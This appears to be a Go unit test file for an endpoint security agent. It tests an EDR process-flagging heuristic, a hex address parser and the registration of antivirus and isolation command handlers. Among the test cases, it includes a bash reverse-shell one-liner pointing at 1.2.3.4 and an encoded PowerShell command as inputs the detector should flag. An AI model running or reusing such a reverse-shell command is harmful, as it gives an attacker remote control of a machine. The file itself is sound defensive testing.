package agent

import "testing"

func TestEDRFlags(t *testing.T) {
	cases := []struct {
		p    edrProc
		want bool
	}{
		{edrProc{Name: "chrome.exe", Path: `C:\Program Files\Google\Chrome\chrome.exe`}, false},
		{edrProc{Name: "a.exe", Path: `C:\Users\x\AppData\Local\Temp\a.exe`}, true},
		{edrProc{Name: "sh", Path: "/tmp/.x/sh"}, true},
		{edrProc{Name: "nginx", Path: "/usr/sbin/nginx"}, false},
		{edrProc{Name: "x", Path: "/usr/bin/x (deleted)"}, true},
		{edrProc{Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, Cmdline: "powershell -enc AAAA"}, true},
		{edrProc{Name: "bash", Path: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"}, true},
	}
	for _, c := range cases {
		if got := len(edrFlags(c.p)) > 0; got != c.want {
			t.Errorf("%+v flagged=%v want %v", c.p, got, c.want)
		}
	}
}

func TestHexAddr(t *testing.T) {
	if got := hexAddr("0100007F:0050"); got != "127.0.0.1:80" {
		t.Fatalf("got %s", got)
	}
}

// Every command the server can send must exist on the agent, or the PC answers "unknown command".
func TestSecHandlersRegistered(t *testing.T) {
	a := &Agent{}
	for _, n := range []string{"av.status", "av.scan", "av.update", "av.threats", "edr.snapshot", "edr.isolate", "edr.release", "module.install", "wol.configure"} {
		if _, ok := a.handlers()[n]; !ok {
			t.Errorf("agent has no handler for %s", n)
		}
	}
}
